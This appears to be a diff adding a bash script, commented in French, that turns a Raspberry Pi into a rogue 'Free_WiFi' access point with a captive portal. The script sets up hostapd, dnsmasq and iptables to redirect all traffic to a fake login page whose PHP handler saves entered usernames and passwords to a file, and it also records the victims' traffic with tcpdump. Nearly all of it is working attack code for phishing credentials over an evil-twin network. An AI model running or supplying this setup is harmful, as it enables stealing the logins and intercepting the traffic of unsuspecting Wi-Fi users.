@@ -1,0 +1,104 @@
+#!/bin/bash
+
+set -e
+
+echo "[*] Mise à jour & installation..."
+apt update && apt upgrade -y
+apt install -y apache2 php aircrack-ng hostapd dnsmasq iptables tcpdump
+
+echo "[*] Préparation des fichiers..."
+mkdir -p /home/pi/pineapple/login
+mkdir -p /home/pi/pineapple/captures
+
+# Page HTML + capture
+cat <<EOF > /home/pi/pineapple/login/index.html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connexion Internet</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding-top: 100px; background-color: #f4f4f4; }
+        input { padding: 10px; width: 300px; margin: 10px; }
+        button { padding: 10px 20px; }
+    </style>
+</head>
+<body>
+    <h2>Connexion au Wi-Fi gratuit</h2>
+    <form method="POST" action="post.php">
+        <input type="text" name="login" placeholder="Identifiant ou Email"><br>
+        <input type="password" name="password" placeholder="Mot de passe"><br>
+        <button type="submit">Connexion</button>
+    </form>
+</body>
+</html>
+EOF
+
+cat <<EOF > /home/pi/pineapple/login/post.php
+<?php
+file_put_contents("/home/pi/pineapple/captures/creds.txt", date("Y-m-d H:i:s") . " | " . \$_POST['login'] . " : " . \$_POST['password'] . "\\n", FILE_APPEND);
+header("Location: https://www.google.com");
+exit();
+?>
+EOF
+
+echo "[*] Déploiement du portail captif..."
+rm -rf /var/www/html/*
+cp /home/pi/pineapple/login/* /var/www/html/
+chown -R www-data:www-data /var/www/html/
+
+# Hostapd config
+cat <<EOF > /etc/hostapd/hostapd.conf
+interface=wlan1
+driver=nl80211
+ssid=Free_WiFi
+hw_mode=g
+channel=6
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
+
+sed -i 's|#DAEMON_CONF=""|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
+
+# Dnsmasq config
+mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig || true
+cat <<EOF > /etc/dnsmasq.conf
+interface=wlan1
+dhcp-range=192.168.1.2,192.168.1.100,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+address=/#/192.168.1.1
+EOF
+
+# IP statique
+cat <<EOF >> /etc/dhcpcd.conf
+
+interface wlan1
+    static ip_address=192.168.1.1/24
+    nohook wpa_supplicant
+EOF
+
+# IP forwarding
+echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
+sysctl -p
+
+# NAT iptables
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
+
+# Redirection HTTP vers Apache (80)
+iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
+
+# Enregistrement des règles
+sh -c "iptables-save > /etc/iptables.ipv4.nat"
+grep -qxF 'iptables-restore < /etc/iptables.ipv4.nat' /etc/rc.local || sed -i '$i\iptables-restore < /etc/iptables.ipv4.nat' /etc/rc.local
+
+echo "[*] Démarrage des services..."
+systemctl enable apache2 hostapd dnsmasq
+systemctl restart dhcpcd apache2 hostapd dnsmasq
+
+echo "[*] Lancement de tcpdump..."
+tcpdump -i wlan1 -w /home/pi/pineapple/captures/capture.pcap &
+
+echo "[✓] Portail captif en place à 192.168.1.1"
+echo "[!] Identifiants stockés dans : /home/pi/pineapple/captures/creds.txt"
